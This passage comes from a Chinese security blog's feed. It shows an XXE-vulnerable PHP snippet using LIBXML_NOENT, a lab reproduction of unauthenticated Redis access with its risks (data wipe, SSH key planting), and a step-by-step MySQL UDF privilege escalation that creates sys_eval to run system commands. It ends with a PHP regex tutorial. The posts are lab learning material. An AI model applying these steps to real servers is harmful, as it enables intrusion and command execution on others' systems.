class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$xml&lt;/span&gt; = simplexml_load_string(&lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&amp;#x27;SimpleXMLElement&amp;#x27;&lt;/span&gt;, LIBXML_NOENT);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 不需要回显时 注释print($xml);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$xml&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Web渗透" scheme="https://hzktester.top/categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="XXE" scheme="https://hzktester.top/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>Radis未授权访问漏洞复现</title>
    <link href="https://hzktester.top/posts/b70654.html"/>
    <id>https://hzktester.top/posts/b70654.html</id>
    <published>2020-11-18T13:38:00.000Z</published>
    <updated>2020-11-18T13:45:27.915Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞特征："><a href="#漏洞特征：" class="headerlink" title="漏洞特征："></a>漏洞特征：</h2><ul><li><code>redis</code>绑定在 <code>0.0.0.0:6379</code>，且没有进行添加防火墙规则避免其他非信任来源<code>ip</code>访问等相关安全策略，直接暴露在公网；</li><li>没有设置密码认证（一般为空），可以免密码远程登录<code>redis</code>服务。 </li></ul><h2 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h2><ul><li>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行<code>flushall</code>来清空所有数据；</li><li>攻击者可通过<code>EVAL</code>执行<code>lua</code>代码，或通过数据备份功能往磁盘写入后门文件；</li><li>最严重的情况，如果<code>Redis</code>以<code>root</code>身份运行，黑客可以给<code>root</code>账户写入<code>SSH</code>公钥文件，直接通过<code>SSH</code>登录受害服务器</li></ul><h2 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h2><p>Redis 2.x，3.x，4.x，5.x</p><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>下载并安装测试用的<code>Redis</code>，本次采用的是<code>Centos7</code>镜像：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-2.8.17.tar.gz</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111801.png" alt="image"><br>解压安装包，进入目录安装<code>radis</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tar xzf redis-2.8.17.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-2.8.17</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111802.png" alt="image"><br>安装完成后，显示如下：<br><img src="https://qiniu.hzktester.top/tp2020111803.png" alt="image"><br><code>make</code>结束后，进入<code>src</code>目录，将<code>redis-server</code>和<code>redis-cli</code>拷贝到<code>/usr/bin</code>目录下（这样启动<code>redis-server</code>和<code>redis-cli</code>就不用每次都进入安装目录了）</p><p>返回目录<code>redis-2.8.17</code>，将<code>redis.conf</code>拷贝到<code>/etc/</code>目录下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cp redis.conf /etc/</span><br></pre></td></tr></table></figure><p>使用<code>/etc/</code>目录下的<code>reids.conf</code>文件中的配置启动<code>redis</code>服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111804.png" alt="image"><br>服务启动成功，我们克隆这台虚拟机，一台作为攻击机，一台作为靶机<br>靶机ip为<code>192.168.3.130</code><br><img src="https://qiniu.hzktester.top/tp2020111805.png" alt="image"><br>攻击机ip为<code>192.168.3.137</code>：<br><img src="https://qiniu.hzktester.top/tp2020111806.png" alt="image"></p><h3 id="未授权访问复现"><a href="#未授权访问复现" class="headerlink" title="未授权访问复现"></a>未授权访问复现</h3><p>靶机启动<code>radis</code>服务：<br><img src="https://qiniu.hzktester.top/tp2020111804.png" alt="image"><br>使用<code>redis</code>客户端直接无账号成功登录<code>redis</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.3.130</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020111807.png" alt="image"><br>从登录的结果可以看出该<code>redis</code>服务对公网开放，且未启用认证。</p><h3 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h3><p>利用姿势可以参考这篇文章，感谢师傅的好文章！<br><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞特征：&quot;&gt;&lt;a href=&quot;#漏洞特征：&quot; class=&quot;headerlink&quot; title=&quot;漏洞特征：&quot;&gt;&lt;/a&gt;漏洞特征：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;code&gt;redis&lt;/code&gt;绑定在 &lt;code&gt;0.0.0.0:6379&lt;/code&gt;，且没有进行添加防火墙规则避免其他非信任来源&lt;code&gt;ip&lt;/code&gt;访问等相关安全策略，直接暴露在公网；&lt;/li&gt;
&lt;li&gt;没有设置密码认证（一般为空），可以免密码远程登录&lt;code&gt;redis&lt;/code&gt;服务。 &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;漏洞危害：&quot;&gt;&lt;a href=&quot;#漏洞危害：&quot; class=&quot;headerlink&quot; title=&quot;漏洞危害：&quot;&gt;&lt;/a&gt;漏洞危害：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行&lt;code&gt;flushall&lt;/code&gt;来清空所有数据；&lt;/li&gt;
&lt;li&gt;攻击者可通过&lt;code&gt;EVAL&lt;/code&gt;执行&lt;code&gt;lua&lt;/code&gt;代码，或通过数据备份功能往磁盘写入后门文件；&lt;/li&gt;
&lt;li&gt;最严重的情况，如果&lt;code&gt;Redis&lt;/code&gt;以&lt;code&gt;root&lt;/code&gt;身份运行，黑客可以给&lt;code&gt;root&lt;/code&gt;账户写入&lt;code&gt;SSH&lt;/code&gt;公钥文件，直接通过&lt;code&gt;SSH&lt;/code&gt;登录受害服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;影响版本：&quot;&gt;&lt;a href=&quot;#影响版本：&quot; class=&quot;headerlink&quot; title=&quot;影响版本：&quot;&gt;&lt;/a&gt;影响版本：&lt;/h2&gt;&lt;p&gt;Redis 2.x，3.x，4.x，5.x&lt;/p&gt;
&lt;h2 id=&quot;漏洞复现：&quot;&gt;&lt;a href=&quot;#漏洞复现：&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现：&quot;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;h3 id=&quot;环境搭建：&quot;&gt;&lt;a href=&quot;#环境搭建：&quot; class=&quot;headerlink&quot; title=&quot;环境搭建：&quot;&gt;&lt;/a&gt;环境搭建：&lt;/h3&gt;&lt;p&gt;下载并安装测试用的&lt;code&gt;Redis&lt;/code&gt;，本次采用的是&lt;code&gt;Centos7&lt;/code&gt;镜像：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wget http://download.redis.io/releases/redis-2.8.17.tar.gz&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Radis" scheme="https://hzktester.top/tags/Radis/"/>
    
  </entry>
  
  <entry>
    <title>MySQL UDF提权执行系统命令</title>
    <link href="https://hzktester.top/posts/d83e4025.html"/>
    <id>https://hzktester.top/posts/d83e4025.html</id>
    <published>2020-11-15T13:38:00.000Z</published>
    <updated>2020-11-25T08:25:38.960Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是UDF库"><a href="#什么是UDF库" class="headerlink" title="什么是UDF库"></a>什么是UDF库</h2><p><code>UDF</code>即用户自定义函数。是通过添加新函数，对<code>MYSQL</code>的功能进行补充，就像使用本地<code>MYSQL</code>函数<code>user()</code>和<code>concat()</code>等。</p><h2 id="UDF提权步骤"><a href="#UDF提权步骤" class="headerlink" title="UDF提权步骤"></a>UDF提权步骤</h2><h3 id="查看secure-file-priv的值"><a href="#查看secure-file-priv的值" class="headerlink" title="查看secure_file_priv的值"></a>查看<strong>secure_file_priv的值</strong></h3><p><code>secure_file_priv</code> 是用来限制<code> load dumpfile</code>、<code>into  outfile</code>、<code>load_file()</code> 函数在哪个目录下拥有上传或者读取文件的权限：</p><p>使用命令<code>show global variables like &#39;secure%&#39;</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like <span class="string">&#x27;secure%&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_auth      | OFF   |</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li>当 <code>secure_file_priv</code> 的值为 <code>NULL </code>，表示限制 <code>mysqld </code>不允许导入|导出，此时无法提权</li><li>当 <code>secure_file_priv </code>的值为 <code>/tmp/</code> ，表示限制 <code>mysqld </code>的导入|导出只能发生在<code>/tmp/</code> 目录下，此时也无法提权</li><li>当 <code>secure_file_priv</code>的值没有具体值时，表示不对 <code>mysqld</code>的导入|导出做限制，此时可提权</li></ul><p><code>secure_file_priv</code>的值在<code>MySQL</code>数据库的安装目录的 <code>my.ini</code> 文件中配置：<br><img src="https://qiniu.hzktester.top/tp2020111501.png" alt="tp2020111501.png"></p><h3 id="查看系统架构以及plugin目录"><a href="#查看系统架构以及plugin目录" class="headerlink" title="查看系统架构以及plugin目录"></a><strong>查看系统架构以及plugin目录</strong></h3><p>首先，我们分别通过<code>@@ version_compile_os</code>和<code>@@ version_compile_machine</code>，来获取当前数据库及操作系统的架构情况。结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@version_compile_os, @@version_compile_machine;</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| @@version_compile_os | @@version_compile_machine |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">| Win32                | AMD64                     |</span><br><span class="line">+----------------------+---------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">&#x27;%compile%&#x27;</span>;</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">| Variable_name           | Value |</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">| version_compile_machine | AMD64 |</span><br><span class="line">| version_compile_os      | Win32 |</span><br><span class="line">+-------------------------+-------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>从<code>MySQL 5.0.67</code>开始，<code>UDF</code>库必须包含在<code>plugin</code>文件夹中，我们可以使用<code>@@ plugin_dir</code>全局变量找到该目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select @@plugin_dir;</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| @@plugin_dir                              |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| C:\phpStudy\PHPTutorial\MySQL\lib\plugin\ |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like <span class="string">&#x27;plugin%&#x27;</span>;</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">| Variable_name | Value                                     |</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">| plugin_dir    | C:\phpStudy\PHPTutorial\MySQL\lib\plugin\ |</span><br><span class="line">+---------------+-------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br></pre></td></tr></table></figure><ul><li>当 <code>MySQL&lt; 5.1</code> 版本时，将 .dll 文件导入到 <code>c:\windows</code> 或者 <code>c:\windows\system32</code> 目录下。</li><li>当 <code>MySQL&gt; 5.1 </code>版本时，将 .dll 文件导入到<code> MySQL Server 5.xx\lib\plugin</code> 目录下 (<code>lib\plugin</code>目录默认不存在，需自行创建)。<h3 id="将dll文件写入plugin目录-并且创建函数"><a href="#将dll文件写入plugin目录-并且创建函数" class="headerlink" title="将dll文件写入plugin目录,并且创建函数"></a><strong>将dll文件写入plugin目录,并且创建函数</strong></h3>我们将使用<code>lib_mysqludf_sys_32.dll</code>的<code>DLL</code>库，你可以在<code>Metasploit</code>框架中找到它。你可以使用基于系统架构的<code>UDF</code>库，它们在<code>Metasploit</code>的安装目录<code>/usr/share/metasploit-framework/data/exploits/mysql/</code>。<a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql">点击这里</a>查看下载：</li></ul><p>我这里做测试，就直接上传到目录中了：<br><img src="https://qiniu.hzktester.top/tp2020111502.png" alt="tp2020111502.png"><br>创建函数<code>sys_eval</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create <span class="keyword">function</span> sys_eval returns string soname <span class="string">&#x27;lib_mysqludf_sys_32.dll&#x27;</span>;</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="使用系统命令"><a href="#使用系统命令" class="headerlink" title="使用系统命令"></a><strong>使用系统命令</strong></h3><p>在将 <code>udf.dll</code> 文件写入<code>plugin</code>目录后，我们就可以使用 <code>sys_eval</code>函数了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from mysql.func <span class="built_in">where</span> name = <span class="string">&#x27;sys_eval&#x27;</span>;<span class="comment">#查看创建的sys_eval函数</span></span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">| name     | ret | dl                      | <span class="built_in">type</span>     |</span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">| sys_eval |   0 | lib_mysqludf_sys_32.dll | <span class="keyword">function</span> |</span><br><span class="line">+----------+-----+-------------------------+----------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select sys_eval(<span class="string">&#x27;whoami&#x27;</span>);<span class="comment">#使用系统命令</span></span><br><span class="line">+---------------------------+</span><br><span class="line">| sys_eval(<span class="string">&#x27;whoami&#x27;</span>)        |</span><br><span class="line">+---------------------------+</span><br><span class="line">| 172_27_0_11\administrator |</span><br><span class="line">+---------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.06 sec)</span><br></pre></td></tr></table></figure><p>如果得到了数据库的用户名和密码，并且可以远程连接的话，可以使用<code>MSF</code>里面的** <strong><code>exploit/multi/mysql/mysql_udf_payload</code></strong> **模块自动注入。</p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://blog.csdn.net/qq_36119192/article/details/84863268">https://blog.csdn.net/qq_36119192/article/details/84863268</a><br><a href="https://blog.csdn.net/wsnbbz/article/details/104802100">https://blog.csdn.net/wsnbbz/article/details/104802100</a><br><a href="https://www.freebuf.com/articles/system/163144.html">https://www.freebuf.com/articles/system/163144.html</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;什么是UDF库&quot;&gt;&lt;a href=&quot;#什么是UDF库&quot; class=&quot;headerlink&quot; title=&quot;什么是UDF库&quot;&gt;&lt;/a&gt;什么是UDF库&lt;/h2&gt;&lt;p&gt;&lt;code&gt;UDF&lt;/code&gt;即用户自定义函数。是通过添加新函数，对&lt;code&gt;MYSQL&lt;/code&gt;的功能进行补充，就像使用本地&lt;code&gt;MYSQL&lt;/code&gt;函数&lt;code&gt;user()&lt;/code&gt;和&lt;code&gt;concat()&lt;/code&gt;等。&lt;/p&gt;
&lt;h2 id=&quot;UDF提权步骤&quot;&gt;&lt;a href=&quot;#UDF提权步骤&quot; class=&quot;headerlink&quot; title=&quot;UDF提权步骤&quot;&gt;&lt;/a&gt;UDF提权步骤&lt;/h2&gt;&lt;h3 id=&quot;查看secure-file-priv的值&quot;&gt;&lt;a href=&quot;#查看secure-file-priv的值&quot; class=&quot;headerlink&quot; title=&quot;查看secure_file_priv的值&quot;&gt;&lt;/a&gt;查看&lt;strong&gt;secure_file_priv的值&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;secure_file_priv&lt;/code&gt; 是用来限制&lt;code&gt; load dumpfile&lt;/code&gt;、&lt;code&gt;into  outfile&lt;/code&gt;、&lt;code&gt;load_file()&lt;/code&gt; 函数在哪个目录下拥有上传或者读取文件的权限：&lt;/p&gt;
&lt;p&gt;使用命令&lt;code&gt;show global variables like &amp;#39;secure%&amp;#39;&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql&amp;gt; show global variables like &lt;span class=&quot;string&quot;&gt;&amp;#x27;secure%&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+------------------+-------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| Variable_name    | Value |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+------------------+-------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| secure_auth      | OFF   |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;| secure_file_priv | NULL  |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;+------------------+-------+&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2 rows &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; (0.00 sec)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;当 &lt;code&gt;secure_file_priv&lt;/code&gt; 的值为 &lt;code&gt;NULL &lt;/code&gt;，表示限制 &lt;code&gt;mysqld &lt;/code&gt;不允许导入|导出，此时无法提权&lt;/li&gt;
&lt;li&gt;当 &lt;code&gt;secure_file_priv &lt;/code&gt;的值为 &lt;code&gt;/tmp/&lt;/code&gt; ，表示限制 &lt;code&gt;mysqld &lt;/code&gt;的导入|导出只能发生在&lt;code&gt;/tmp/&lt;/code&gt; 目录下，此时也无法提权&lt;/li&gt;
&lt;li&gt;当 &lt;code&gt;secure_file_priv&lt;/code&gt;的值没有具体值时，表示不对 &lt;code&gt;mysqld&lt;/code&gt;的导入|导出做限制，此时可提权&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;secure_file_priv&lt;/code&gt;的值在&lt;code&gt;MySQL&lt;/code&gt;数据库的安装目录的 &lt;code&gt;my.ini&lt;/code&gt; 文件中配置：&lt;br&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020111501.png&quot; alt=&quot;tp2020111501.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;查看系统架构以及plugin目录&quot;&gt;&lt;a href=&quot;#查看系统架构以及plugin目录&quot; class=&quot;headerlink&quot; title=&quot;查看系统架构以及plugin目录&quot;&gt;&lt;/a&gt;&lt;strong&gt;查看系统架构以及plugin目录&lt;/strong&gt;&lt;/h3&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="https://hzktester.top/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="UDF提权" scheme="https://hzktester.top/tags/UDF%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>正则表达式，字符串的匹配与查找函数，数组切割</title>
    <link href="https://hzktester.top/posts/c0ec548.html"/>
    <id>https://hzktester.top/posts/c0ec548.html</id>
    <published>2020-11-10T09:09:00.000Z</published>
    <updated>2020-11-12T13:00:01.488Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP中的正则表达式"><a href="#PHP中的正则表达式" class="headerlink" title="PHP中的正则表达式"></a>PHP中的正则表达式</h2><blockquote><p>在php中，有两套正则表达式函数库，两者功能相似、知识执行效率略有差异：</p></blockquote><ul><li><code>PCRE</code>库提供，使用<code>preg_</code>为前缀命名的函数</li><li><code>POSIX</code>扩展提供的。使用以<code>ereg_</code>为前缀命名的函数</li></ul><p><code>PCRE</code>来源于<code>Perl</code>语言，而Perl是对字符串操作功能最强大的语言之一，<code>PHP</code>的最初版本就是由<code>Perl</code>开发的产品。</p><p><code>PCRE</code>语法支持更多特性，比<code>POSIX</code>语法更强大。</p><h3 id="与Perl语言兼容的正则表达式处理函数"><a href="#与Perl语言兼容的正则表达式处理函数" class="headerlink" title="与Perl语言兼容的正则表达式处理函数"></a>与Perl语言兼容的正则表达式处理函数</h3><table><thead><tr><th align="center"><strong>函数名</strong></th><th><strong>功能描述</strong></th></tr></thead><tbody><tr><td align="center"><strong>preg_match()</strong></td><td>进行正则表达式匹配</td></tr><tr><td align="center"><strong>preg_match_all()</strong></td><td>进行全局正则表达式匹配</td></tr><tr><td align="center"><strong>preg_replace()</strong></td><td>执行正则表达式的搜索和替换</td></tr><tr><td align="center"><strong>preg_split()</strong></td><td>用正则表达式分割字符串</td></tr><tr><td align="center"><strong>preg_grep()</strong></td><td>返回与模式匹配的数组单元</td></tr><tr><td align="center"><strong>preg_replace_callback</strong></td><td>用回调函数执行正则表达式的搜索和替换</td></tr></tbody></table><h2 id="正则表达式语法规则"><a href="#正则表达式语法规则" class="headerlink" title="正则表达式语法规则"></a>正则表达式语法规则</h2><p>正则表达式作为一个匹配的模板，是由原子（普通字符，例如字符a到z）、特殊字符（元字符，例如*、+和？等）、以及模式修正符三部分组成的匹配模板。</p><h3 id="定界符"><a href="#定界符" class="headerlink" title="定界符"></a>定界符</h3><p>在程序语言中，使用与<code>Perl</code>兼容的正则表达式，通常都需要将模式表达式放入定界符之间，如<code>/</code>。</p><p>作为定界符常使用反斜线<code>/</code>，如<code>/apple/</code>。用户只要把需要匹配的模式内容放入定界符之间即可。作为定界的字符也不仅仅局限于<code>/</code>。除了字母、数字和斜线<code>\</code>以外的任何字符都可以作为定界符，像  <code>#</code>、<code>|</code>、<code>! </code>等都可以的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/&lt;\/\w+&gt;/--使用反斜线作为定界符合法</span><br><span class="line">|(\d&#123;3&#125;)-\d+|Sm --使用竖线”|”作为定界符合法</span><br><span class="line">!^(?i)php[34]!--使用竖线”!”作为定界符合法</span><br><span class="line">&#123;^\s+(\s+)?$&#125; --使用竖线”&#125;”作为定界符合法</span><br><span class="line">/href=‘(.*)’ --非法定界符，缺少结束定界符</span><br><span class="line">1-\d3-\d3-\d4| --非法定界符，缺少定界符</span><br></pre></td></tr></table></figure><h3 id="原子"><a href="#原子" class="headerlink" title="原子"></a>原子</h3><p>原子是正则表达式的最基本的组成单元，而且在每个模式中最少要少包含一个原子。原子是由所有那些未显示指定为元字符的打印和非打印字符组成，具体分为5类。</p><ul><li>普通字符作为原子： 如 <code>a~z</code>、<code>A~Z</code>、<code>0~9</code> 等</li><li>一些特殊字符和转义后元字符作为原子：所有标点符号，但语句特殊意义的符号需要转义后才可作为原子，如：<code>\” \’ \* \+ \? \.</code> 等</li><li>一些非打印字符作为原子： 如：<code>\f \n  \r \t \v \cx</code></li><li>使用“通用字符类型”作为原子：如：<code>\d \D \w \W \s \S</code>。</li><li>自定义原子表<code>([])</code>作为原子：如：<code>/[apj]sp/</code>、<code>/[^apj]sp/</code><h4 id="正则表达式中常用的非打印字符"><a href="#正则表达式中常用的非打印字符" class="headerlink" title="正则表达式中常用的非打印字符"></a>正则表达式中常用的非打印字符</h4></li></ul><table><thead><tr><th><strong>原子字符</strong></th><th><strong>含义描述</strong></th></tr></thead><tbody><tr><td><strong>\cx</strong></td><td>匹配由x指明的控制字符。如\cM匹配一个Control-M或回车符。x的值必须为A<del>Z或a</del>z之一。</td></tr><tr><td><strong>\f</strong></td><td>匹配一个换页符。等价于   \x0c或\cL</td></tr><tr><td><strong>\n</strong></td><td>匹配一个换行符。等价于   \x0a或\cJ</td></tr><tr><td><strong>\r</strong></td><td>匹配一个回车符。等价于   \x0d或\cM</td></tr><tr><td><strong>\t</strong></td><td>匹配一个制表符。等价于   \x09或\cI</td></tr><tr><td><strong>\v</strong></td><td>匹配一个垂直制表符。等价于   \x0b或\cK</td></tr></tbody></table><h4 id="正则表达式中常用的“通用字符类型”"><a href="#正则表达式中常用的“通用字符类型”" class="headerlink" 